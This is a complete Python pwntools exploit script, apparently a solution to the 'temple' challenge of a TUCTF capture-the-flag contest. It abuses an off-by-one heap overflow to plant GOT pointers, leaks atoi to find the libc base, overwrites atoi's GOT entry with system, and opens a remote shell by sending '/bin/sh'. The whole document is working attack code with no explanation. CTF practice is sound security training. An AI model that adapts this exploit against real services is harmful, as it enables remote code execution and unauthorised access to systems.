from pwn import *

local = 0
if local:
    r = process('./temple')
    e = ELF('./temple')
    libc = e.libc
else:
    r = remote('temple.tuctf.com', 4343)
    e = ELF('./temple')
    libc = ELF('./libc.so.6')

def read_wisdom(index):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('What wisdom do you seek?: ', str(index))

def add_wisdom(size, content):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('How much wisdom do you hold?: ', str(size))
    r.sendafter('What is your wisdom?: ', content)

def edit_wisdom(index, content):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('What wisdom do you wish to rethink?: ', str(index))
    r.sendafter('How do you see this differently?: ', content)

# off by 1 and concate
add_wisdom(0x10, 'A'*14+'\n')
add_wisdom(0x10, 'B'*14+'\n')
edit_wisdom(8, 'A'*16+'\xb0')
read_wisdom(9)

# malloc to overwrite
add_wisdom(0x50, p64(0x8)+p64(e.got['atoi'])+p64(0x8)+p64(e.got['atoi'])+p64(0x31)*2+(p64(0x8)+p64(e.got['atoi']))*2)

# leak libc
read_wisdom(7)
atoi = u64(r.recv(8))
libc_base = atoi - libc.symbols['atoi']
log.info('libc base: %#x' % libc_base)

system = libc_base + libc.symbols['system']

# overwrite atoi
edit_wisdom(8, p64(system))

r.sendline('/bin/sh')
r.clean()

r.interactive()
